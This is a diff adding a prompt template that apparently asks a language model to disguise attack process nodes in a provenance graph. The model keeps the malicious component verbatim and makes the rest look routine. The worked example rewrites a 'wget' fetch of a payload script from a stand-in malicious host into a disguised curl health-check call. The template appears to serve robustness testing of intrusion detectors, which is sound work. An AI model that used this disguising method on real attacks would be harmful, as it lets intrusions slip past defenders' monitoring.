@@ -1,0 +1,35 @@
+[Context]
+The attack process node below has exactly one component (either the command
+name or the arguments) marked as attack-specific and must be preserved
+verbatim; the other component is benign-compatible and must be replaced with
+values that blend into the surrounding context C.
+
+[Input]
+Process node:
+    command_name = {name}
+    arguments    = {args}
+    preserve     = "command_name" | "arguments"   (the attack-specific component)
+Context C (neighboring events as typed triples):
+    [(src_type:attr, op, dst_type:attr), ...]
+
+[Task]
+Keep the component indicated by `preserve` exactly as given. Substitute the
+other component with benign values drawn from or compatible with C, so the
+resulting full command appears as a routine operation in the surrounding
+context.
+
+[Constraints]
+(1) generated values must be legitimate system commands, file names, or IP addresses;
+(2) mutated values must be compatible with neighboring operations in C;
+(3) the preserved component must appear verbatim in the output.
+
+[Output]
+JSON: {"new_command_name": "...", "new_arguments": "..."}.
+
+[Example]
+Input: command_name="wget", arguments="http://mal.com/pay.sh", preserve="arguments"
+(the malicious URL), C = web-monitoring routines.
+Output:
+{"new_command_name": "curl",
+ "new_arguments": "-H \"X-Health-Check: true\" http://mal.com/pay.sh"}
+— the malicious URL appears as a routine monitoring target.
